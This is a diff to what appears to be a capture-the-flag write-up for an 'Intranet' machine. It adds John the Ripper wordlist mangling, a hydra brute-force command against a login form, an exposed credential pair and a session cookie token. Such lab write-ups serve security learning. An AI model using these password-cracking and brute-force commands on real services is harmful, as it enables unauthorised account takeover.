@@ -98,7 +98,7 @@ PORT     STATE SERVICE    VERSION
 ```
 
 <br>
-<h2 align="center">Vulnerability Assessmentt</h2>
+<h2 align="center">Vulnerability Assessment</h2>
 
 ```bash
 :~# nikto -h xx.xxx.x.xxx
@@ -226,11 +226,44 @@ developer
 senior
 ```
 
-<h2 align="center">John the Ripper . Wordlist</h2>
+<h2 align="center">A.txt</h2>
 
-```bash
-(rosana) :~/Intranet# john -wordlist:reference -rules:jumbo -stdout > words
-```
+:~/Intranet# cat A.txt
+securesolacoders
+
+<h2 align="center">B.txt</h2>
+
+:~/Intranet# john --wordlist:A.txt -rules:jumbo -stdout > B.txt
+Using default input encoding: UTF-8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+70539p 0:00:00:00 100.00% (2025-10-01 13:54) 641263p/s sesola
+
+:~/Intranet# head -n 14 B.txt
+securesolacoders
+Securesolacoders
+secure
+secures
+secur
+securesolacoderssecuresolacoders
+Sredocaloseruces
+Securesolacoderssecuresolacoders
+SECURESOLACODERS
+sredocaloseruces
+securesolacoderses
+Securesolacoderses
+SecuresolacodersSecuresolacoders
+secu
+
+
+:~/Intranet# sed -i 's/[^a-zA-Z0-9]//g' B.txt
+
+:~/Intranet# john --wordlist:A.txt -rules:jumbo -stdout > B.txt
+Using default input encoding: UTF-8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+70539p 0:00:00:00 100.00% (2025-10-01 13:54) 641263p/s sesola
+
+
+
 
 <h2 align="center">Users</h2>
 
@@ -248,7 +281,7 @@ admin@securesolacoders.no
 - <code>anders@securesolacoders.no</code> : <code>securesolarcoders2022</code></p>
 
 ```bash
-(rosana) :~/Intranet# hydra -L users -P words -s 8080 xx.xxx.x.xxx http-post-form "/login:username=^USER^&password=^PASS^:Error:" -t 50
+(rosana) :~/Intranet# hydra -L users.txt -P B.txt -s 8080 xx.xxx.x.xxx http-post-form "/login:username=^USER^&password=^PASS^:Error:" -t 50
 ...
 [DATA] max 50 tasks per 1 server, overall 50 tasks, 108588 login tries (l:1/p:108588), ~2172 tries per task
 [DATA] attacking http-post-form://xx.xxx.x.xxx:8080/login:username=^USER^&password=^PASS^:Error:
@@ -354,6 +387,12 @@ Connection: close
     <hr>
 ...
 ```
+
+eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN0nAA.CLnAPZ2JQMsOgOzQ2DmOonzQJVQ
+
+eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN0nAA.CLnAPZ2JQMsOgOzQ2DmOonzQJVQ
+
+
 
 <img width="1272" height="366" alt="image" src="https://github.com/user-attachments/assets/f8535953-8b46-4177-865d-49619a0d4fa8" />
 
